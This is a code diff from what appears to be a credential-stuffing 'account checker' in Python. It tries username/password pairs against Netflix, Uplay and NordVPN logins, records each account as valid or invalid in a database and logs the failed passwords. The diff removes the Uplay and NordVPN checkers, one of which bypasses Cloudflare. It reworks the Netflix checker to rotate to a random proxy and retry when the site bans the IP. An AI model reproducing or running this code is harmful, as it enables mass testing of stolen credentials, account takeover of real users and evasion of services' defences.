@@ -55,90 +55,39 @@ def pornhub(usr, pwd, mr):
     log.info("-------------------------------")
     mr.req.cookies.clear()
 
-def netflix(usr, pwd, mr):
-    mr : ManageRequests
+
+def netflix(usr: str, pwd: str, mr: ManageRequests):
     site_url = "https://www.netflix.com/Login"
 
     # Get login page with authURL
-    res = mr.req.get(site_url, headers={'User-Agent': 'Mozilla/5.0'})
+    res = mr.get_with_checks(site_url, headers={'User-Agent': 'Mozilla/5.0'})
     # Filter out authURL value
-    soup = BeautifulSoup(res.text, features="html.parser")
-    authURL = soup.find('input', attrs={'name': 'authURL'})['value']
-
-    # Post request to login
-    res = mr.post_with_checks(site_url,
-                              data={'email': usr,
-                                    'password': pwd,
-                                    'rememberMe': True,
-                                    'flow': 'websiteSignUp',
-                                    'mode': 'login',
-                                    'action': 'loginAction',
-                                    'withFields': 'email,password,rememberMe,nextPage',
-                                    'authURL': authURL,
-                                    'nextPage': 'https://www.netflix.com/viewingactivity'
-                                    })
-
-    if 'Login' not in res.url:
-        mr.db.update_result(usr, pwd, "netflix", "True")
-        log.info("Account valid {}".format(usr))
-    else:
-        mr.db.update_result(usr, pwd, "netflix", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-    log.info("-------------------------------")
-    mr.req.cookies.clear()
-
-
-def uplay(usr, pwd, mr):
-    mr: ManageRequests
-    usr: str
-    pwd: str
-    site_post = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
-    creds = str.encode(usr + ":" + pwd)
-    encoding = base64.b64encode(creds).decode()
-    mr.req.headers = {"Content-Type": "application/json", "Ubi-AppId": "e06033f4-28a4-43fb-8313-6c2d882bc4a6",
-                      "Authorization": "Basic " + encoding}
-    res = mr.post_with_checks(site_post)
-
     if res:
-        if res.status_code == 200:
-            mr.db.update_result(usr, pwd, "uplay", "True")
+        soup = BeautifulSoup(res.text, features="html.parser")
+        authURL = soup.find('input', attrs={'name': 'authURL'})['value']
+
+        # Post request to login
+        res = mr.post_with_checks(site_url,
+                                  data={'email': usr,
+                                        'password': pwd,
+                                        'rememberMe': True,
+                                        'flow': 'websiteSignUp',
+                                        'mode': 'login',
+                                        'action': 'loginAction',
+                                        'withFields': 'email,password,rememberMe,nextPage',
+                                        'authURL': authURL,
+                                        'nextPage': 'https://www.netflix.com/viewingactivity'
+                                        })
+
+        if 'Login' not in res.url:
+            mr.db.update_result(usr, pwd, "netflix", "True")
             log.info("Account valid {}".format(usr))
         else:
-            mr.db.update_result(usr, pwd, "uplay", "False")
+            mr.db.update_result(usr, pwd, "netflix", "False")
             log.info("Account error {} {}".format(usr, pwd))
+        log.info("-------------------------------")
     else:
-        mr.db.update_result(usr, pwd, "uplay", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-
-    log.info("-------------------------------")
-    mr.req.cookies.clear()
-
-
-def nordvpn(usr, pwd, mr):
-    """
-    Custom functions must have 3 params: username and password to check, and a ManageRequests object
-    The MR object has all the primitives that you need.
-    Remember to update the database via mr.db
-    """
-
-    sitePost = "https://ucp.nordvpn.com/api/v1/users/login"
-    siteGet = "https://ucp.nordvpn.com/login"
-    # Retrieve CF valid cookie
-
-    cookies = mr.bypass_cf(siteGet)
-    # change proxy account
-    res = mr.post_with_checks(sitePost,
-                              data={"username": usr, "password": pwd}, cookies=cookies)
-    res = dict(res.cookies).get("token", None)
-
-    # check if inside the cookie the token is set, if positive the account is valid
-    if res:
-        mr.db.update_result(usr, pwd, "nordvpn", "True")
-        mr.db.update_result(usr, pwd, "nordvpnProxy", "True")
-        log.info("Account valid {}".format(usr))
-    else:
-        mr.db.update_result(usr, pwd, "nordvpn", "False")
-        mr.db.update_result(usr, pwd, "nordvpnProxy", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-    log.info("-------------------------------")
+        log.error("Netflix banned the ip, forcing change")
+        mr.set_random_proxy()
+        netflix(usr, pwd, mr)
     mr.req.cookies.clear()
